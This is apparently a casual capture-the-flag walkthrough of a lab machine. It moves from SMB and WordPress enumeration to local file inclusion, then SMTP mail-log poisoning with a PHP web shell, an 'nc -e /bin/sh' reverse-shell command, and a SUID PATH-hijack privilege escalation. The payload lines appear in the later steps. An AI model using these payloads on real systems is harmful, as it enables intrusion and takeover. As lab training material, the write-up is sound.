**IP of the machine :- 192.168.122.11**

![](attachment/c848924d6d0229bd3ab93a11f1c722dc.png)
machine on!!!!!

![](attachment/01043f32e8b81eec8b38c0a3a6afbe6e.png)
smtp and smb is running...... that's interesting!!!!

![](attachment/36cd7b0a3c2951fbb36bdf6d0b89f63b.png)
did a script scan to learn about the versions running.

![](attachment/9f5cbadb905596019cfe95a085eb9a84.png)
gobuster scan results.

![](attachment/30a4ab93d55986cdcd84f6dcb292fac8.png)
Found SMB shares and a possible username named "Helios"

![](attachment/278ffd883af44db92f7ce3a16ba84cab.png)
got a file in anonymous share "attention.txt"

![](attachment/03c717bdac6bfb44738a0fc6869802ef.png)
got some possible passwords.

![](attachment/a3dd99ed9924e89a6b107eaa1d053de6.png)
got two more possible files and pass was "qwerty"

![](attachment/e443697af430acb5e2e841c027b530f7.png)
![](attachment/efc01b0a94c4a1f5976c9dfbea91ec9a.png)
let's see /h3li05

![](attachment/051d93226e058051ac7f492ac443067c.png)
got wordpress let's run wpscan.

![](attachment/72aa12ca6876bb602749c3d00e9ffb56.png)
found an uplods directory for local file inclusion.

![](attachment/c99166d1f64788f9453a6634557c329f.png)
found this in uploads directory.....................

![](attachment/738b4fd3af150a8a13a73460f7059a8a.png)
will be using this exploit.....................

![](attachment/1ec064718cad183fbe4b1451b6374821.png)
was able to see the /etc/passwd and found username "helios"

![](attachment/bfb4e864f265aa0cd805da965bd167a7.png)
connected to the smtp server added this pup exploit to execute os commands and get a reverse shell into the system.

![](attachment/7dbbb46fa682bfc390edc7d4f8b860ff.png)
will be using this exploit to gain reverse shell.

![](attachment/1144d4b530b432e31ca53998836e68b5.png)
Now went to /var/mail/helios directory where we can execute our os commands and we also execute command id command with it by querying using 'c' parameter which we added when connected to smtp server using telnet "`<?php system($_GET['c']); ?>`".

now we can add c=nc -e /bin/sh 192.168.122.11 9999 to get a reverse shell in the mail directory of the user helios.

![](attachment/be7a462be5e15b3c855872e3d0d5e6b5.png)
Got reverse shell......

![](attachment/03b4da9ba5a595971f7399dfbd120382.png)
Found a strange SUID file "/opt/statuscheck"

![](attachment/b5a1187742b0850c4b4defa6e066011b.png)
Did strings on the file because it was a binary and found that it is using curl.

![](attachment/3568913d500ac9d5ee8addc571b09399.png)
so added a shell in curl and did 777 permission on the curl and added directory in the PATH env variable, which means we can execute file in /tmp directory and when the file is ran which suid permissions the curl command will run and has read, write and exec. permission by all three and it will lead to vertical priv. esc.

![](attachment/72abe9cb146703615428d34b560c94d3.png)